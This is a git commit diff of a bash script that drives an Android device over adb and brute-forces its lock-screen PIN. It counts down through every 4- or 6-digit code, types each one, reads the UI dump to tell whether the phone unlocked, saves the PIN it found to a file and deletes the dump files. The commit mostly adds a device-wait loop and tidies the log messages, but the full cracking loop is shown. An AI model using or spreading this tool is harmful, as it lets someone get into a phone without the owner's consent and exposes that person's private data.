22ec625ee0ceae7c7e564b680343a728b1cc4203
ArastaD0t <38872983+ArastaD0t@users.noreply.github.com>
2022-03-26 13:14:32 +0000

    Add files via upload

--- main.sh
+++ main.sh
@@ -5,18 +5,38 @@ alias ScreenOn='adb shell input keyevent 26'
 alias Enter='adb shell input keyevent 66'
 alias EnterPass='adb shell input keyevent 82'
 #############################################
+Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
+
+while [ $Connected != "device" ] ;
+do
+clear
+echo "[ADB] Waiting for device... "
+sleep 2
+clear
+echo "[ADB] Waiting for device.."
+sleep 1
+clear 
+echo "[ADB] Waiting for device."
+clear 
+Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
+done
+echo "[ADB] Connected !"
 ScreenOn
-
+echo "[ADB] Screen on"
 EnterPass
+echo "[ADB] Go to input"
 
-echo "How much digits is on screen ?"
-echo "  1) 4 digits"
-echo "  2) 6 digits"
+echo "#####################################"
+echo "[APC] How much digits is on screen ?"
+echo "#####################################"
+echo "  1) 4-Digits"
+echo "  2) 6-Digits"
  
 read n
+clear
 case $n in
   1)
-	echo selected 4 digits
+	echo "[AFC] selected 4-Digits"
 	gen=9999
 	EnterPass
 
@@ -26,14 +46,14 @@ then
    while [ True ];
 		do
 		gen=$(($gen-1)) 
-		echo trying $gen
+		echo "[AFC] trying $gen"
 		Text $gen
 		Enter
                 adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin"
                 then echo ""
                 else 
-                   echo UNLOCKED with $gen 
+                   echo "[AFC] UNLOCKED with $gen !" 
                    touch  $gen.is.pin
                    adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                    break
@@ -44,7 +64,7 @@ fi
 
 	;;
   2) 
-	echo selected 6 digits
+	echo "[AFC] selected 6-Digits"
 	gen=999999
 	EnterPass
 
@@ -53,14 +73,14 @@ then
    while [ True ];
                 do
                 gen=$(($gen-1)) 
-		echo Trying $gen
+		echo "[AFC] Trying $gen"
                 Text $gen
                 Enter
 		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin" 
                 then echo ""
                 else 
-		   echo UNLOCKED with $gen 
+		   echo "[AFC] UNLOCKED with $gen !" 
 		   touch  $gen.is.pin
 		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
 	  	   break
@@ -74,7 +94,7 @@ fi
 
 
 	;;
-  *) echo "echo invalid option"
+  *) echo "[AFC] invalid option"
    ./main.sh
 	;;
 esac
